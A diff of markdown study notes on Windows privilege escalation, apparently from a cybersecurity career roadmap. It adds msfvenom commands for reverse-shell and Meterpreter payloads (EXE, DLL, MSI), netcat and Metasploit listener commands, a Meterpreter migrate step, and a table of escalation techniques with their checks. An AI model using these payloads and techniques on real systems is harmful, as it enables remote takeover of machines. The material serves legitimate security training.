+### Generate payloads (Kali)
+```bash
+# EXE payload — service exploits and general use
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f exe -o reverse.exe
+
+# EXE Meterpreter variant
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o reverse.exe
+
+# DLL payload — DLL hijacking
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f dll -o target.dll
+
+# MSI payload — AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f msi -o reverse.msi
+```
+
+### Start listener
+```bash
+# Netcat
+sudo nc -nvlp 53
+
+# Metasploit
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <KALI_IP>; set lport 4444; exploit"
+```
+
+### On Meterpreter shell — migrate immediately
+```meterpreter
+migrate -N LogonUI.exe
 ```
 
 ---
@@ -482,7 +658,7 @@ icacls "C:\SomePath\file.exe"
 ## Quick Reference Table
 
 | Technique | What is exploited | Privilege gained | Key check |
-|-----------|------------------|-----------------|-----------|
+|---|---|---|---|
 | Weak service ACL | SERVICE_CHANGE_CONFIG permission | SYSTEM | `accesschk -uwcqv` |
 | Unquoted service path | Spaces in unquoted BINARY_PATH_NAME | SYSTEM | `wmic service get pathname` |
 | Weak registry ACL | Writable service registry key | SYSTEM | `accesschk -uvwqk` |
@@ -491,12 +667,16 @@ icacls "C:\SomePath\file.exe"
 | AlwaysInstallElevated | GPO allows .msi to run as SYSTEM | SYSTEM | `reg query ...AlwaysInstallElevated` |
 | Registry plaintext creds | AutoLogon password stored in plaintext | Admin | `reg query ...winlogon` |
 | Saved credentials | Cached runas credentials | Admin | `cmdkey /list` |
-| SAM dump + crack | Insecure backup of SAM/SYSTEM | Admin | `C:\Windows\Repair\` |
+| SAM dump and crack | Insecure backup of SAM/SYSTEM | Admin | `C:\Windows\Repair\` |
 | Pass the Hash | NTLM auth accepts raw hash | Admin | Any obtained NTLM hash |
 | Scheduled task script | Writable script run by SYSTEM task | SYSTEM | `schtasks /query` + `accesschk` |
 | Startup folder | Writable global StartUp directory | Admin | `accesschk -d StartUp` |
 | PrintSpoofer | SeImpersonatePrivilege + Print Spooler | SYSTEM | `whoami /priv` |
 | RoguePotato | SeImpersonatePrivilege + DCOM | SYSTEM | `whoami /priv` |
-| DLL hijacking | Missing/writable DLL on load path | SYSTEM | Process Monitor NAME NOT FOUND |
+| DLL hijacking | Missing or writable DLL on load path | SYSTEM | Procmon NAME NOT FOUND |
 | Insecure GUI app | Elevated GUI exposes file dialog | Admin | `tasklist /V` |
 | UAC bypass | Medium integrity admin session | Admin (High) | `whoami /groups` |
+
+---
+
+*Part of a structured cybersecurity career roadmap — working toward OSWE and CWEE.*
